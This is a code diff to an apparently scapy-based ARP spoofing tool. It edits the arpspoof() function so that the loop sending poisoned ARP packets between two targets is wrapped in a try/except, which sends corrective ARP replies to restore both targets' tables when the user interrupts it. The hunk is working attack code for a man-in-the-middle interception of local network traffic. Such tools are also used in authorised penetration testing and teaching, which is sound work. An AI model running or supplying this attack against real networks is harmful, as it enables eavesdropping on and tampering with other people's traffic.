@@ -412,25 +412,25 @@ def arpspoof():
     print("[Info] --> ARP Spoofing attack is started ....")
     time.sleep(1)
     print("[Instruction] --> To stop the attack and restore all the targets ARP tables, press on the left \"ctrl+c\" once or more if needed")
-    #try:
-    while True:
-        spoofing(ipo, iptw, mact)
-        time.sleep(1)
-        spoofing(iptw, ipo, mactt)
-        print("\r ARP Spoofing packets sent: "+str(integ), end="")
-        integ += 4
-        time.sleep(1)
-    #except:
-        #print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
+    try:
+        while True:
+            spoofing(ipo, iptw, mact)
+            time.sleep(1)
+            spoofing(iptw, ipo, mactt)
+            print("\r ARP Spoofing packets sent: "+str(integ), end="")
+            integ += 4
+            time.sleep(1)
+    except:
+        print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
         #mact = getm(ipo)
         #macs = getm(iptw)
-        #packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=macs)
-        #sc.send(packetre,verbose=False,count=3)
-        #packetree = sc.ARP(op=2,hwdst=macs,pdst=iptw,psrc=ipo,hwsrc=mact)
-        #sc.send(packetree, verbose=False, count=3)
-        #print("[Info] --> All the ARP tables of the targets are restored ")
-        #time.sleep(2)
-        #exit()
+        packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=mactt)
+        sc.send(packetre,verbose=False,count=3)
+        packetree = sc.ARP(op=2,hwdst=mactt,pdst=iptw,psrc=ipo,hwsrc=mact)
+        sc.send(packetree, verbose=False, count=3)
+        print("[Info] --> All the ARP tables of the targets are restored ")
+        time.sleep(2)
+        exit()
 
 
 def getm(ip):
